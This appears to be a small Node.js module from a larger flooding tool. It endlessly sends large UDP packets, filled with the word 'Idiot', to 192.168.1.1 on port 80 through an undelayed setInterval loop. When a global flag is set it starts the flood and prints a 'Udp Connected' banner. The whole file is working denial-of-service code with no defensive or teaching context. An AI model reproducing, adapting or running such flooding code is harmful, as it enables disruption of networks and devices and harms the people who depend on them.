require('../config.js')
const dgram = require('dgram');
const ip = '192.168.1.1';
const port = 80;
const client = dgram.createSocket('udp4');
const c = require('chalk');

function udp() {
  const teks = Buffer.from('Idiot'.repeat(5096));
  client.send(teks, 0, teks.length, port, ip, (error) => {
    if (error) {
      console.log(error);
    }
  });
}

function udps() {
 setInterval(() => {
 	udp();
 });
}

if (global.udp){
	udps();
	console.log(c.grey.bold('                Udp Connected...                 '));
} else {
	console.log(c.red.bold('                Udp Disconnect :(                 '));
}
